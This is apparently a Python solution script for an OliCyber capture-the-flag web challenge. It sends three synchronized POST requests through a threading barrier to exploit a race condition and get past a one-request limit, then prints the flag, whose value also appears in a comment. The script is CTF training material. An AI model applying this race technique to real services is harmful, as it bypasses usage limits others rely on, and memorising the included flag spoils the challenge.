import requests
import threading
import re

#la flag viene mostrata solo se count >= 3, la challenge ci permette di fare però una sola POST e quindi di arrivare massimo a count = 1. ci basta inviarne 3 insieme

site = "http://invalsi.challs.olicyber.it"
r = requests.get(site)
cookie = r.cookies["session"]

BARRIER = threading.Barrier(3)

def send():
    BARRIER.wait()
    requests.post(site, cookies = {"session" : cookie}, json = ["1", "1", "0"])


threads = []
for _ in range (3):
    t = threading.Thread(target = send)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

r = requests.get(f"{site}/flag", cookies = {"session" : cookie}).text
match = re.search(r'flag\{[^\}]+\}', str(r))
flag = match.group(0)
print(flag)

#flag{57up1d0_53xy_f4b10_64b1bb0}
